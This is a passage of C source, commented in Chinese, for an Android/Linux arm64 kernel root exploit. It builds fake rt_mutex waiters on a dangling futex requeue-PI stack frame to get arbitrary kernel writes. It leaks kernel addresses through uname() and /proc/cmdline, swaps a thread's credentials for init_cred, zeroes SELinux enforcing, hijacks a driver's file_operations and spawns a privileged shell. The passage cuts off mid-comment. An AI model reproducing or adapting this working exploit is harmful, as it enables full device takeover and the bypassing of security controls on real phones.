          P = ICRED - 4;   /* 补刀: 纯零写落在 uid(+4)+gid(+8) 这 8 字节 */
          C = 0;
          LV = 0;
        }
      } else if (ph == 7) {
        return;                                        /* 收口相: 不 punch */
      } else { say("[-] sen: 未知相 %d\n", ph); return; }
      for (int i = 0; i < 0x200 / 8; i++) p64(FRM, SR_FB + 8 * i, 0);
      uint64_t s2[10];
      s2[0] = P; s2[1] = C; s2[2] = LV;
      s2[3] = (uint64_t)(S + 0x18); s2[4] = 0; s2[5] = 0;
      s2[6] = LK_INIT_TASK + SLIDE; s2[7] = FLOCK; s2[8] = (uint64_t)WP_PRIO; s2[9] = 0;
      for (int j = 0; j < 10; j++) p64(FRM, SR_FB + 8 * (WAITER_WORD + j), s2[j]);
      if (ph == 2) {
        /* 伪 file_operations 摆在带内 FOPS_BASE_WORD 起: owner=0(过 fops_get) / read=stats_read */
        p64(FRM, SR_FB + 8 * (FOPS_BASE_WORD + 0), 0);                 /* +0x00 owner */
        p64(FRM, SR_FB + 8 * (FOPS_BASE_WORD + 1), 0);                 /* +0x08 llseek ← 第二笔落这 */
        p64(FRM, SR_FB + 8 * (FOPS_BASE_WORD + 2), LK_STATSD_READ + SLIDE);  /* +0x10 read ★ */
        p64(FRM, SR_FB + 8 * (FOPS_BASE_WORD + 3), 0);                 /* +0x18 write */
        p64(FRM, SR_FB + 8 * (FOPS_BASE_WORD + 11), 0);                /* +0x58 release */
      }
      if (verbose || ph != h_lastlog) {
        h_lastlog = ph;
        say("[W] sen 相%d%s: 目的=%016lx 值=%016lx 假lock=%lx prio=%d fops=%lx\n", ph,
            shape4 ? "(形状4:左子写)" : (C ? "(形状2:指针写)" : "(形状1:纯零写)"),
            (unsigned long)(shape4 ? LV : P + 8), (unsigned long)(shape4 ? P : C),
            (unsigned long)FLOCK, WP_PRIO, (unsigned long)LEAK_FOPS_ADDR);
      }
      return;
    }
    /* --- 控制相(先钉死"这具内核的 .bss 到底能不能被我写进去"): ---
     * run_rd1 的谜: 与 run_root1 **同一套载荷模板、同一个相序位置**, 只把目的从
     *   init_uts_ns(.data ⇒ 每次真机都确认落地) 换成 saved_command_line(.bss) ⇒
     *   6 发 punch **既不落地也不炸**; 而 selinux_state(.bss) 那两次是**当场重启**。
     * ⇒ 同是 .bss 却两种表现 ⇒ 不能靠猜。这一相把**指针值**写进 avenrun(.bss),
     *   观察通道换成 /proc/loadavg: 落地的话第一列会变成 (ptr-32)>>32 ≈ 42 亿 ⇒ 一眼可辨,
     *   且读 loadavg 零副作用、不依赖 SELinux。 */
    if (ph == 1) {
      P = LK_AVENRUN + SLIDE - 8;
      C = LK_SELINUX_STATE + SLIDE;
    } else if (ph == 2) {                        /* 判别相: 打印起点放在 **.data(内容已知!)**
	                                                 * uts+0x24 早已被相0 写过 S(无 NUL) ⇒ 若这一发落地,
	                                                 * /proc/cmdline 会印出 `pc` 之后紧跟 uts 的那串字节;
	                                                 * 若仍印原始命令行 ⇒ saved_command_line 这个变量本身
	                                                 * 写不动(或被内核自己改回), 与"起点是不是栈"无关。 */
      P = LK_SAVED_CMDLINE + SLIDE - 8;
      C = LK_INIT_UTS + SLIDE + 0x24;
    } else if (ph == 3) {                        /* 判别相2: 起点放回**带内栈槽**(run_ctrl1 失败的那一种) */
      static const char MARK[8] = "A1CDEFG";
      P = LK_SAVED_CMDLINE + SLIDE - 8;
      C = S + 0x100;
      for (int k = 0; k < 7; k++) FRM[SR_FB + 0x150 + k] = MARK[k];
    } else if (ph >= 4 && ph <= 9) {             /* 读通道: 从 S 往下的死帧逐段印 */
      P = LK_SAVED_CMDLINE + SLIDE - 8;
      C = S + RD_OFF[ph - 4];
    } else if (ph == 10) {                      /* 验真: 印 cand+0x60 ⇒ [16..23] 应当是 W 的栈基址 */
      uintptr_t cd = h_cand;
      if (!cd) { say("[-] 相10 没有候选可验\n"); return; }
      P = LK_SAVED_CMDLINE + SLIDE - 8;
      C = cd + 0x60;
    } else if (ph == 11) {
      if (!TASK) { say("[-] 相%d 需要 TASK(应由读通道扫栈拿到并二次验证)\n", ph); return; }
      P = TASK + OFF_T_CRED - 8; C = LK_INIT_CRED + SLIDE;
      say("[P] 提权: *(%016lx) <- %016lx\n", (unsigned long)(TASK + OFF_T_CRED), (unsigned long)C);
    } else if (ph == 12) {
      if (!TASK) { say("[-] 相12 需要 TASK\n"); return; }
      P = TASK + OFF_T_REALCRED - 8; C = LK_INIT_CRED + SLIDE;
      say("[P] 提权: *(%016lx) <- %016lx\n", (unsigned long)(TASK + OFF_T_REALCRED), (unsigned long)C);
    } else if (ph == 13) {
      return;                                   /* 收口相: 不 punch ⇒ 带脏不脏无所谓, 什么都不铺 */
    } else { say("[-] 未知相 %d\n", ph); return; }
    for (int i = 0; i < 0x200 / 8; i++) p64(FRM, SR_FB + 8 * i, 0);   /* 整带清零(含假 lock) */
    /* 带内假树根 N2 = S+0x100 那一套"预置+rb_next 读"几何已判废(见 GHOST-READ-CHANNEL) */
    uint64_t v[10];
    v[0] = P;                                /* tree.pc: parent = 落点-8(且位0=0=RED ⇒ 不 rebalance) */
    v[1] = C;                                /* tree.right = child = 要写的值(0 ⇒ 纯零写, 无配对写) */
    v[2] = 0;                                /* tree.left = 0 ⇒ 走"独子"分支 */
    v[3] = (uint64_t)(S + 0x18);             /* pi_tree.pc = 自己 ⇒ RB_EMPTY_NODE ⇒ 不动这棵树 */
    v[4] = 0; v[5] = 0;
    v[6] = LK_INIT_TASK + SLIDE;             /* waiter->task: 出口会 wake_up_process(它) ⇒ 给 idle */
    v[7] = FLOCK;                            /* waiter->lock = 带内假 lock */
    v[8] = (uint64_t)WP_PRIO;                /* prio 门 ⇒ 不等才继续往下走 */
    v[9] = 0;
    for (int j = 0; j < 10; j++) p64(FRM, SR_FB + 8 * (WAITER_WORD + j), v[j]);
    if (verbose || ph != h_lastlog) {
      h_lastlog = ph;
      say("[W] 相%d: C=%lx P=%lx 假lock=%lx prio=%d%s\n", ph,
          (unsigned long)C, (unsigned long)P, (unsigned long)FLOCK, WP_PRIO,
          C ? " (指针写)" : " (纯零写)");
    }
    return;
  }
  if (SHAPE == 2) {
    /* 形状(3) 的"无地雷"版: 一笔可见又无害的写 + 顺带把 S 漏进 sysname。
     * pc = 1 ⇒ `ands x8,x10,#-4` = 0 ⇒ 走 parent==NULL 分支:
     *   `str x9,[x1]`  ⇒ root->rb_node = right = T (=init_uts_ns.name.sysname, 可 uname 读回)
     *   `str x10,[x9]` ⇒ ***(T) = 1**               ← 这笔试本身肉眼可见("Linux"→01 00...)
     * 随后 rt_mutex_enqueue 从 root=T 下潜: 读 *(T+0x40)=0 ⇒ 取右槽 *(T+8)=0 ⇒ 就地插入
     *   ⇒ **(T+8) = S**  ← 受害者内核栈上 waiter 的真实地址被泄漏出来, uname() 直接读
     *   并且"不是 leftmost" ⇒ rb_leftmost 保持 0 ⇒ [9] 出口既不解引用 task 也不 wake_up。
     * ★ 关键的地雷排除: 之后 rb_insert_color(S) 会看**父节点 T 的颜色** = *(T)&1;
     *   Linux 里 RED ⇔ bit0==0 ⇒ 写 0 进 T 会让它以为"父是红的"⇒ 进循环取
     *   gparent = *(T)&~3 = 0 ⇒ 解引用 NULL ⇒ panic(这就是上一轮 SHAPE=0 第一发就炸的原因)。
     *   把写进去的值取成 **1** ⇒ 父节点是黑的 ⇒ 循环立刻退出, 只把 S 涂黑 ⇒ 安全。 */
    w[0] = 1;
    w[1] = (TGT_ABS < 0) ? FAKE_TGT : (uintptr_t)(TGT_ABS + SLIDE);  /* T = 写目标 */
    w[2] = 0;
    w[3] = 0; w[4] = 0; w[5] = 0;
    w[6] = LK_INIT_TASK + SLIDE;
    w[7] = FAKE_LOCK;
    w[8] = (uint64_t)WP_PRIO;
    w[9] = 0;
  }
  if (SHAPE == 1) {
    /* 形状(1) "parent≠NULL + right=0": rb_erase 只做 `*(parent+8) = 0` 然后 ret
     * ⇒ **任意对齐 8 字节零写, 不需要"邻居是 0", 也不碰 root->rb_node**
     * (见 analysis/GHOST-WRITE-SHAPES-20260927.md)。
     * 目标 = selinux_state(DISABLE=y ⇒ enforcing 在 state+1) 的那个对齐字。
     * 副作用: enqueue 走空树分支 ⇒ rb_leftmost=S ⇒ [9] 会 wake_up_process(*(S+0x30))
     *        ⇒ task 字段给 init_task(idle, state=TASK_RUNNING ⇒ 早退空操作)。 */
    w[0] = LK_SELINUX_STATE + SLIDE - 8;   /* parent = 目标-8 ⇒ 写 *(目标)=0 */
    w[1] = 0;                              /* right = 0 ⇒ 写完直接 ret, 不 rebalance */
    w[2] = 0;
    w[3] = (LK_UTS + 0x20) + SLIDE;        /* pi_tree 三格放零洞(不解引用, 求干净) */
    w[4] = 0; w[5] = 0;
  }
  /* NCOPY>0: 在"起点 ≡ WAITER_WORD (mod 10 字)"这个同余类里一次铺满多份**完整**假 waiter
   * (周期 0x50 = 10 字 ⇒ 多份之间互不重叠、互不干扰), 一次开机就覆盖该类里所有可能的
   * 起点对齐; 命中的那一份会顺带把真实 S 写进假 lock 的 rb_node(init_uts_ns 零洞)
   * ⇒ uname() 直接读出 S ⇒ 反推真实偏移, 后续载荷就不必再猜。 */
  int ncopy = NCOPY ? NCOPY : 1;
  for (int c = 0; c < ncopy; c++) {
    int base = WAITER_WORD + 10 * c;
    if (base + 10 > 0x200 / 8) break;
    for (int j = 0; j < 10; j++) p64(FRM, SR_FB + 8 * (base + j), w[j]);
  }
  if (verbose)
    say("[G] 载荷: %d 份假 waiter, 起点字 %d..%d(步长 10), prio 字=起点+8, SHAPE=%d\n",
        ncopy, WAITER_WORD, WAITER_WORD + 10 * (ncopy - 1), SHAPE);
}

/* ============ hammer: 铺完立刻 punch 的同步节拍 ============
 * 为什么必须要它: 覆盖层落在内核栈的**浅区**(深度 0x140..0x340, 距异常入口 SP 只有
 * 几百字节)。受害者 W 铺完载荷后回到用户态, 这段地址就变成"空闲" —— 下一次任何
 * **在 W 的 CPU 上发生的异常**(时钟节拍 250Hz、设备 IRQ、W 自己的下个 syscall)都会
 * 从同一个入口 SP 重新往下压栈, 把浅区整个重画掉。
 * ⇒ 旧代码"铺完 usleep(200ms) 再 punch"必然读到的是 IRQ 残渣(不是我们的载荷),
 *   这正好解释了 9/27 那三次对照(全 120 / 全 139 / 完全不下毒)为什么**一模一样地炸**。
 * ⇒ 正确做法: W 铺完就纯自旋(一个 syscall 都不做), 立刻让 main 打 punch,
 *   把"铺→读"的间隔压到几微秒, 让节拍/IRQ 来不及插进来。
 * 相位: 0=空 1=载荷已就位等 punch 2=main 已打完可以重铺
 */
static volatile int h_armed, h_fired, h_stop, h_ready;
static volatile int h_keep;   /* 1 = 读相"抢最新 task"模式: 铺完被打后**不等 ready**, 立刻再铺 */
static volatile int h_dokid;  /* 1 = 让 W 在被打之后自己去 clone(孩子才继承 W 改过的 cred) */
static volatile int h_round_end;   /* main: 这回合完了, 去造下一颗幽灵 */
/* ★★回合协议(9/27 两次"第 1/2 发就炸"的真实原因是**载荷变陈**, 不是载荷写错):
 *   覆盖层在 [E-0x2E0, E-0xE0) 这段"浅区", 任何发生在 W 所在 CPU 上的 EL0 异常
 *   (250Hz 节拍/IPI/软中断)都会从同一个栈顶往下重新压帧 ⇒ **把这段整个重画掉**。
 *   所以"铺载荷 → 读载荷"的间隔必须是 µs 量级。旧写法是 W 先铺好再置 armed,
 *   而 main 那时可能还在打日志(open/write/fsync/close ~200us) ⇒ 真正 punch 落在
 *   一块被节拍洗过的垃圾上 ⇒ 链走照着垃圾指针解引用 ⇒ panic(命中率≈每几发一次)。
 * ⇒ 改成**反向握手**: main 把杂活干完才置 ready; W 看到 ready 才铺, 铺完立刻 armed;
 *   main 自旋等 armed(纯 load, ns 级)后**一个 syscall 都不插**直接 sched_setattr。*/
/* ---- two(/hijack) 模式: 同一 boot 内两发, 一发一次写 ----
 * 第 1 发(LEAK): 形状(3) 把 1 写进 init_uts_ns.name.sysname[4], 顺带把 S 漏进同一个洞
 *                (已在 9/27 真机验证: 设备活着, uname() 读回 S)。
 * 第 2 发(HIJACK): 用**另一块零洞**当假 lock(第 1 发把 lock#1 的树弄脏了, 复用会走歪树),
 *                并把假 file_operations 摆在**已知的带内地址**(S 已知 ⇒ 可算) ⇒
 *                形状(2) 一次写: *(C)=P 与 *(P+8)=C, 其中
 *                  C = ashmem_misc + 0x10  (.data 里的 miscdevice.fops, 可写)
 *                  P = 带内假 fops 的起点 (可读写, 配对那笔正好落在我们自己的表里)
 *                之后 open("/dev/ashmem") 就用我们的表 ⇒ .read 槽是 CFI 同类型的
 *                stats_read(设备反汇编核实: from=file->private_data 纯线性基址,
 *                avail=0x63ed0, 不解引用不加锁) ⇒ 既能证明劫持成立, 又是一条不会崩的读通道。 */

/* ===== "victim" = 提权靶子换成一条**与链走无关**的线程(2026-09-28) =====
 * 孪生弹差分给出的结论: 形状(2) 的配对写盖住 init_cred 的头 8 字节 **本身不炸**;
 * 炸的是"把**正在被这条链走改动的 task** 的 cred 换掉"(7 轮里 5 次当场重启)。
 * 而 SLA 表里"改名过的线程"这一类是**实测每次都能命中**的(W 就是靠这个认出来的),
 * 所以最省事的解法不是换判据, 是换一个"同样能被认出、但链走绝不碰"的任务:
 *   - 它是一条只做 `getuid()` 自报 + 睡一小会的 pthread(comm = gk<pid><tid>);
 *   - 相3/相4 改的是它的 cred ⇒ 链走(init_task 为 task、W 的栈为节点)完全不看它;
 *   - 它自己把 getuid() 报进 v_uid/v_seq ⇒ 主观判据仍然是一手的;
 *   - 最后由**它** clone 孩子 exec `id` ⇒ 举证链和靶子是同一个任务。 */
static int VICTIM = 0;
static volatile int v_uid = -1, v_euid = -1, v_seq = 0, v_ready = 0, v_dokid = 0;
static int v_tid = 0;
static char v_mark[24] = "";
static void *victim_thread(void *x) {
  (void)x;
  pin_to(WCPU);   /* ★ 和 W 同一个核: v5/v6 两轮都找不到靶子那条记录, 而 v2 找得到 —— 这张
                  *   SLA 表很可能是按核/集群采样的, 旁观线程若漂到别的集群就不入表。
                  *   钉到 WCPU 让它和 W 处在同一张表的采样域里(实测 W 的记录每轮必在)。 */
  v_tid = (int)syscall(SYS_gettid);
  snprintf(v_mark, sizeof v_mark, "gk%x%x", (unsigned)(getpid() & 0xffff), (unsigned)(v_tid & 0xffff));
  prctl(PR_SET_NAME, (unsigned long)v_mark, 0, 0, 0);
  __atomic_store_n(&v_ready, 1, __ATOMIC_RELEASE);
  say("[V] 靶子线程起来了: tid=%d comm=[%s] (它不参与 futex/链走, 只自报 uid)\n", v_tid, v_mark);
  for (;;) {
    __atomic_store_n(&v_uid, (int)getuid(), __ATOMIC_RELEASE);
    __atomic_store_n(&v_euid, (int)geteuid(), __ATOMIC_RELEASE);
    __atomic_add_fetch(&v_seq, 1, __ATOMIC_RELEASE);
    if (__atomic_load_n(&v_dokid, __ATOMIC_ACQUIRE)) {
      __atomic_store_n(&v_dokid, 0, __ATOMIC_RELEASE);
      kid_new(); kid_new();          /* 由靶子亲生 => 继承它刚被改过的 cred */
      if (SHELLMODE) {
        long r = syscall(SYS_clone, (long)SIGCHLD, 0L, 0L, 0L, 0L);
        if (r == 0) shell_child();
        if (r > 0) __atomic_store_n(&v_shellpid, (int)r, __ATOMIC_RELEASE);
        say("[V] 我亲自 clone 了两个举证孩子 + 一个会话 shell(tid=%d, shellpid=%ld)\n", v_tid, r);
      } else {
        say("[V] 我亲自 clone 了两个孩子(tid=%d)\n", v_tid);
      }
    }
    usleep(3000);
  }
  return NULL;
}
static void *waiter_thread(void *x) {
  struct timespec ts;
  pin_to(WCPU);
  p_tid = (int)syscall(SYS_gettid);
  if (SENOFF) {
    /* 给 W 一个每轮唯一的 comm ⇒ /proc/sla 那张"每任务一条"的表里能凭它认出 W 的 task_struct */
    snprintf(w_mark, sizeof w_mark, "gh%x%x", (unsigned)(getpid() & 0xffff), (unsigned)(p_tid & 0xffff));
    prctl(PR_SET_NAME, w_mark, 0, 0, 0);
    say("[W] 我的 comm = [%s] (相2 靠它在 /proc/sla 里认出自己)\n", w_mark);
  }
  long r1 = fx(C, FLOCKPI, 0, NULL, NULL, 0);
  fprintf(stderr, "[W] lock C ret=%ld errno=%d\n", r1, errno);
  if (r1 != 0) { stop_all = 1; return NULL; }
  st_c_locked = 1;

  int round = 0;
 restart:
  errno = 0;
  abs_after(&ts, round ? 3 : 8);     /* 超时返回 ⇒ 留下悬空 pi_blocked_on = 幽灵 */
  st_w_sleeping = 1;
  if (round == 0) say("[W] 进 WAIT_REQUEUE_PI 前实测 prio=%ld\n", read_prio(p_tid));
  long r2 = fx(N, FW, 0, &ts, PI, (int)MATCH_ANY);
  if (round == 0) fprintf(stderr, "[W] WAIT_REQUEUE_PI ret=%ld errno=%d\n", r2, errno);
  __atomic_store_n(&st_ghost, 1, __ATOMIC_RELEASE);

  if (HAMMER) {
    /* 铺 → 等被打 → 再铺。中间 W 一个 syscall 都不做(任何 syscall 都会把浅区重画掉)。
     * h_keep=1(读相"抢最新 task"模式): 被打完**不等 ready** 立刻再铺, 于是 main 可以
     * 每发都在"铺好之后"插一次 clone ⇒ 每一次 punch 用的都是刚 clone 出来的那个最新 task。 */
    for (;;) {
      if (h_stop || stop_all) break;
      if (!__atomic_load_n(&h_keep, __ATOMIC_ACQUIRE)) {
        while (!__atomic_load_n(&h_ready, __ATOMIC_ACQUIRE)) {
          if (h_stop || stop_all) break;
          __asm__ volatile("yield" ::: "memory");
        }
        if (h_stop || stop_all) break;
        __atomic_store_n(&h_ready, 0, __ATOMIC_RELEASE);
      }
      spray_build(FAKE_TGT);
      long rr = 0;
      if (!NO_SPRAY) rr = sr_call(FRM);
      if (rr != 0) { say("[-] 帧被拒 r=%ld(后面不再铺)\n", rr); break; }
      __atomic_store_n(&h_armed, 1, __ATOMIC_RELEASE);
      while (!__atomic_load_n(&h_fired, __ATOMIC_ACQUIRE)) {
        if (h_stop || stop_all) break;
        __asm__ volatile("yield" ::: "memory");
      }
      __atomic_store_n(&h_fired, 0, __ATOMIC_RELEASE);
      __atomic_store_n(&h_armed, 0, __ATOMIC_RELEASE);
      if (SENOFF) {
        /* ★ 报告"我这一发之后是谁": 用 libc 的 getuid/geteuid(不走变参 syscall 包装),
         *   并且**每报告一次 w_seq++** ⇒ main 能确认拿到的是"这一发之后"的值, 不是上一轮的残渣。 */
        int u = (int)getuid(), e = (int)geteuid();
        __atomic_store_n(&w_uid, u, __ATOMIC_RELEASE);
        __atomic_store_n(&w_euid, e, __ATOMIC_RELEASE);
        __atomic_add_fetch(&w_seq, 1, __ATOMIC_RELEASE);
        if (__atomic_load_n(&h_phase, __ATOMIC_ACQUIRE) >= 3)
          say("[W] 我这轮自报 tid=%d getuid()=%d geteuid()=%d (seq=%d)\n", p_tid, u, e,
              __atomic_load_n(&w_seq, __ATOMIC_ACQUIRE));
      }
      if (__atomic_load_n(&h_dokid, __ATOMIC_ACQUIRE)) {
        __atomic_store_n(&h_dokid, 0, __ATOMIC_RELEASE);
        kid_new(); kid_new();          /* ★ 由 W 亲生 ⇒ 这两个孩子继承的是 W 刚被改过的 cred */
      }
      if (__atomic_load_n(&h_round_end, __ATOMIC_ACQUIRE)) {
        __atomic_store_n(&h_round_end, 0, __ATOMIC_RELEASE);
        __atomic_store_n(&st_ghost, 0, __ATOMIC_RELEASE);   /* 交回给 main: 还没成幽灵 */
        round++;
        if (round >= MAX_ROUNDS) break;
        goto restart;                                        /* ★ 再造一颗幽灵 */
      }
    }
    st_payload = 1;
    return NULL;
  }
  spray_build(FAKE_TGT);
  long r3;
  if (NO_SPRAY) {
    say("[B] nospray: 不进 sr_call ⇒ 幽灵保持 futex 留下的原始悬空字节\n");
    r3 = 0;
  } else {
    r3 = sr_call(FRM);
  }
  say("[M1] W sr_call 返回 r=%ld\n", r3);
  if (r3 != 0) fprintf(stderr, "[W] 帧被拒 r=%ld errno=%ld\n", r3, -r3);
  st_payload = 1;

  /* 纯用户态忙等(绝对不做 syscall: 任何 syscall 的栈帧链都会重画 [0x131,0x340) 这段):
   * 载荷就静静地躺在内核栈里等着被链走读。 */
  while (!st_punch_done && !stop_all) {
    for (volatile int k = 0; k < 2000; k++) __asm__ volatile("" ::: "memory");
  }
  return NULL;
}

/* 独立观察线程: 每 ~200us 读一次 uname(), 只要 sysname 区变了就 fsync 落盘。
 * 打 punch 的线程会在链走里被炸掉, 但 panic 到真正重启之间有几秒,
 * 这个线程的最后一行日志能告诉我们内核在死之前到底写进 init_uts_ns 了什么。 */
static volatile int obs_stop;
static void read_sysname(char *hex, size_t n);
static void *observer_thread(void *x) {
  char prev[1024];
  read_sysname(prev, sizeof prev);
  say("[M1] 观察线程启动 base=%s\n", prev);
  while (!obs_stop) {
    char cur[1024];
    read_sysname(cur, sizeof cur);
    if (strcmp(cur, prev)) {
      say("[LEAK] sysname 变了: %s\n", cur);
      memcpy(prev, cur, strlen(cur) + 1);
    }
    usleep(200);
  }
  return NULL;
}

static void *owner_thread(void *x) {
  long r1 = fx(PI, FLOCKPI, 0, NULL, NULL, 0);
  fprintf(stderr, "[O] lock PI ret=%ld errno=%d\n", r1, errno);
  if (r1 != 0) { stop_all = 1; return NULL; }
  st_pi_locked = 1;
  long r2 = fx(C, FLOCKPI, 0, NULL, NULL, 0);   /* O 阻塞在 W 持有的 C 上 ⇒ 形成环 */
  fprintf(stderr, "[O] lock C ret=%ld errno=%d\n", r2, errno);
  return NULL;
}

static void read_sysname(char *hex, size_t n) {
  /* uname() 把内核 init_uts_ns.name 原样拷过来(每字段 65 字节, 不 NUL 截断)
   * ⇒ 能看到被抹掉的 "Lin" 和紧跟其后的 8 字节 S(受害者内核栈地址) */
  struct utsname u;
  *hex = 0;
  if (uname(&u) != 0) { snprintf(hex, n, "uname失败 errno=%d", errno); return; }
  unsigned char *raw = (unsigned char *)&u;      /* struct utsname = 5×65 字节连续 */
  int lim = (int)((n - 1) / 2);
  if (lim > 0x145) lim = 0x145;                  /* uts+0x04 .. uts+0x148 */
  size_t o = 0;
  for (int i = 0; i < lim && o + 3 < n; i++) o += (size_t)snprintf(hex + o, n - o, "%02x", raw[i]);
  hex[o] = 0;
}

/* 唯一的内核读通道: /proc/cmdline 印 saved_command_line(我们把它的值改到哪就读到哪)。
 * seq_puts 印到第一个 NUL ⇒ **读到的字节数本身就是信息**(P 处第一个 NUL 的偏移)。
 * 用 raw read + hex 落盘, 不要 cat/head(不可打印字节会被吃掉)。 */
static ssize_t read_cmdline(unsigned char *out, size_t n) {
  int fd = open(PROBE_PATH, O_RDONLY | O_CLOEXEC);
  if (fd < 0) return -1;
  ssize_t r = read(fd, out, n);
  close(fd);
  return r;
}
static void hexbuf(char *hex, size_t n, const unsigned char *b, ssize_t len) {
  size_t o = 0;
  *hex = 0;
  for (ssize_t i = 0; i < len && o + 3 < n; i++) o += (size_t)snprintf(hex + o, n - o, "%02x", b[i]);
  hex[o] = 0;
}

/* 从 hex 串的第 byte 字节起取小端 8 字节 */
static uintptr_t hexq(const char *hex, int byte) {
  uintptr_t v = 0;
  for (int i = 7; i >= 0; i--) {
    char t[3] = { hex[2 * (byte + i)], hex[2 * (byte + i) + 1], 0 };
    v = (v << 8) | (uintptr_t)strtoul(t, NULL, 16);
  }
  return v;
}
/* 把一次 /proc/cmdline 读回来的原始字节里所有"像 task_struct"的核指针收集成候选。
 * 排序规则: **在同一颗幽灵的多次读里重复出现**的排最前(schedule()/__schedule()/futex_*
 * 都会把 `prev = current` 存进 callee-saved 寄存器或栈槽 ⇒ 同一个 task 指针往往出现在好几层
 * 帧里, 而临时的一次性指针不会)⇒ 出现两次就顶到第 0 位。 */
static void note_candidates(const char *hex, ssize_t rl) {
  for (ssize_t i = 8; i + 8 <= rl; i += 8) {      /* 跳过打印起点那 8 字节(=pc) */
    uintptr_t v = hexq(hex, (int)i);
    if (!v || (v & 7)) continue;
    if ((v >> 40) != 0xffffffULL) continue;       /* 看着像核指针 */
    uintptr_t im0 = LK_TEXT_BASE + SLIDE, im1 = im0 + 0x1C00000;
    if (v >= im0 && v < im1) continue;            /* 镜像内 = 数据/代码, 不是 task */
    if (h_S && v >= h_S - 0x8000 && v < h_S + 0x2000) continue;   /* 栈区间内(含 S 自己) */
    if (v == LK_SAVED_CMDLINE + SLIDE - 8 || v == LK_INIT_TASK + SLIDE) continue;
    if (v >= h_S - 0x88 && v < h_S + 0x200) continue;             /* 我们自己铺的带内值 */
    int k;
    for (k = 0; k < ncand; k++) if (CAND[k] == v) break;
    if (k < ncand) {
      if (k > 0) { uintptr_t t = CAND[k]; CAND[k] = CAND[k - 1]; CAND[k - 1] = t; ci_now = 0; }
      say("[CAND] %016lx 重复出现 ⇒ 顶到首位(最像 current 的备份)\n", (unsigned long)CAND[0]);
    } else if (ncand < 8) {
      CAND[ncand++] = v;
      say("[CAND] 新候选 #%d = %016lx (窗口内偏移 +0x%zx)\n", ncand, (unsigned long)v, (size_t)i);
    }
  }
}
static uintptr_t leaked_stack(const char *hex) {
  /* enqueue 把 S 写进 T+0x10(=sysname[20..27]) 或 T+8(=sysname[12..19]),
   * 取决于 prio 比较结果; 两个槽都试 */
  int L = (int)(strlen(hex) / 2);
  if (L < 40) return 0;
  /* S 可能落在 T+8(sysname 0x28..0x2f) 或 T+0x10; 扫全部 8 字节窗口找核指针 */
  /* ★ sysname 在 init_uts_ns+0x04 ⇒ 内核里 8 对齐的字落在 sysname 偏移 ≡4 (mod 8) 处;
   *   按 8 步进扫会**系统性错过** S(9/27 第一次是我手算出来的, 把这个 bug 盖掉了)。 */
  uintptr_t im0 = LK_TEXT_BASE + SLIDE, im1 = im0 + 0x1C00000;   /* text..data..bss 全算镜像 */
  for (int b = 0; b + 8 <= L; b += 4) {
    uintptr_t v = hexq(hex, b);
    if (v == 0 || (v & 7) != 0) continue;
    if ((v >> 40) != 0xffffffULL && (v >> 48) != 0xffffULL) continue;
    if (v >= im0 && v < im1) { say("[scan] name+%d = %016lx (镜像内: 那是 root->rb_node=T, 忽略)\n",
                                    b, (unsigned long)v); continue; }
    say("[scan] name+%d = %016lx  <== 候选 S(非镜像)\n", b, (unsigned long)v);
    return v;
  }
  return 0;
}

static void say(const char *fmt, ...) __attribute__((format(printf, 1, 2)));
static void say(const char *fmt, ...) {
  char buf[512];
  va_list ap;
  va_start(ap, fmt);
  vsnprintf(buf, sizeof buf, fmt, ap);
  va_end(ap);
  fputs(buf, stderr);
  fflush(stderr);
  /* 关键: 崩溃/重启后还能看到走到哪一步 ⇒ 每行 O_APPEND + fsync 落盘 */
  int fd = open("/data/local/tmp/pr.log", O_WRONLY | O_CREAT | O_APPEND, 0666);
  if (fd >= 0) {
    ssize_t w = write(fd, buf, strlen(buf));
    (void)w;
    fsync(fd);
    close(fd);
  }
}

/* 读内核的"现在还是 enforcing 吗": /sys/fs/selinux/enforce 一个字节 '1'/'0'。
 * shell 域允许读 ⇒ 可以当 shape1 零写的现场判据(不用等重启后 getenforce)。 */
static int read_enforce(void) {
  int fd = open("/sys/fs/selinux/enforce", O_RDONLY);
  if (fd < 0) return -1;
  char b = '?';
  ssize_t n = read(fd, &b, 1);
  int e = errno;
  close(fd);
  if (n != 1) { errno = e; return -2; }        /* 读不到内容(SELinux 被当成 disabled 时会这样) */
  return (int)b;
}

/* ★★★ 本机实测勘误(2026-09-28): **`/sys/fs/selinux/enforce` 不能当判据**。
 * `sel_read_enforce@0xffffffc0107adadc` 里被 scnprintf 打出来的那个字节不是静态 selinux_state+1,
 * 而是一条**四级间接链**: `filp->[+0x20]->[+0x28]->[+0x490]->[+0x78]` 再 `ldrb [x8,#1]`
 * (而且宽度被改成 w1=0xc) ⇒ shell 现在读到的是 "182" 这种**非 0/1** 的数
 * (实测: enforce=182, checkreqprot=178, policyvers=31, mls=1) ⇒ "读回 0"这个判据在本机
 * 构造上就不成立。⇒ 判据换成**行为级**: 能不能打开 /sys/kernel/tracing/kprobe_events
 * (0666 root:readtracefs ⇒ DAC 早放行, 唯一挡路的是 MAC), 这正是我们下一步真正要的东西。
 * ★ 但**写目标仍然是对的**: 静态 selinux_state 的 byte1 确有钩子在直接读它
 *   (selinux_netlink_send 里 `ldrb w8,[x27,#1]`, x27 = adrp 直取的静态对象), 且
 *   selinux_init 用 `strb w8,[x19,#1]` 初始化它 ⇒ enforcing = 静态 selinux_state+1 ✔ */
static int gate_kprobe(int verbose) {
  static const char *p[2] = { "/sys/kernel/tracing/kprobe_events",
                              "/sys/kernel/debug/tracing/kprobe_events" };
  for (int i = 0; i < 2; i++) {
    int fd = open(p[i], O_RDWR | O_CLOEXEC);
    if (fd >= 0) { close(fd); return 0; }
    if (verbose) say("[GATE] open(%s) errno=%d(%s)\n", p[i], errno, strerror(errno));
  }
  return -1;
}

/* enforce 文件在本机被厂商改成了"多值连印"(实测打的是 "182" 而不是 "1\n") ⇒ 只看第一个字符
 * 会被"整个数字非 0"骗到(libselinux 用 %d 读 ⇒ "082" 仍是非 0 ⇒ getenforce 报 Enforcing)。
 * 所以这里把**整段原文**读回来, 判据必须建立在原文变化上。 */
static int read_enforce_txt(char *out, int n) {
  int fd = open("/sys/fs/selinux/enforce", O_RDONLY | O_CLOEXEC);
  if (fd < 0) { snprintf(out, n, "(open errno=%d)", errno); return -1; }
  ssize_t r = read(fd, out, n - 1);
  int e = errno;
  close(fd);
  if (r <= 0) { out[0] = 0; snprintf(out, n, "(read r=%zd errno=%d)", r, e); return -2; }
  out[r] = 0;
  return (int)r;
}

/* ===== "MAC 到底还拦不拦"的**行为级**探针 =====
 * ★★ 2026-09-28 真机勘误(曾经据此误判过一次"permissive 没生效"):
 *   `/sys/kernel/tracing/kprobe_events` 与 `current_tracer`/`set_event`/`dynamic_events` 是
